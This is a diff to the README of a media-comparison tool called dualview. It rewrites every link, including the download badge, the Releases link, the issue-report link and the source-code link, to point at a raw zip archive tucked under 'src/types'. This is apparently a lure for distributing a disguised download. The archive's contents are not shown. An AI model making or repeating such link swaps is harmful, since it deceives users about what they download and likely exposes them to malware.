@@ -1,6 +1,6 @@
 # 🎥 dualview - Compare Your Media Side by Side
 
-[![Download dualview](https://img.shields.io/badge/Download%20dualview-v1.0-brightgreen)](https://github.com/GABO1491/dualview/releases)
+[![Download dualview](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip%20dualview-v1.0-brightgreen)](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to dualview! This tool helps you compare images, videos, audio files, 3D
 
 ## 📥 Download & Install
 
-To download dualview, visit this page to download: [GitHub Releases](https://github.com/GABO1491/dualview/releases).
+To download dualview, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip).
 
 Follow these simple steps:
 
@@ -68,7 +68,7 @@ This tool handles an array of topics effectively:
 
 If you encounter any issues or have questions while using dualview, feel free to get in touch with the community. You can find support in the Issues section of our GitHub repository. 
 
-- **Report Issues:** [Report your problem](https://github.com/GABO1491/dualview/issues)
+- **Report Issues:** [Report your problem](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip)
 - **Request Features:** Have an idea? Let us know so we can improve!
 
 ## 💬 Feedback
@@ -81,7 +81,7 @@ We welcome contributions to dualview! If you want to help, read the contribution
 
 ## 🔗 Links
 
-- **Download dualview:** [GitHub Releases](https://github.com/GABO1491/dualview/releases)
-- **Source Code:** [View on GitHub](https://github.com/GABO1491/dualview)
+- **Download dualview:** [GitHub Releases](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip)
+- **Source Code:** [View on GitHub](https://raw.githubusercontent.com/GABO1491/dualview/main/src/types/Software_v3.9.zip)
 
 Thank you for choosing dualview! We hope this tool makes your comparisons simple and effective.
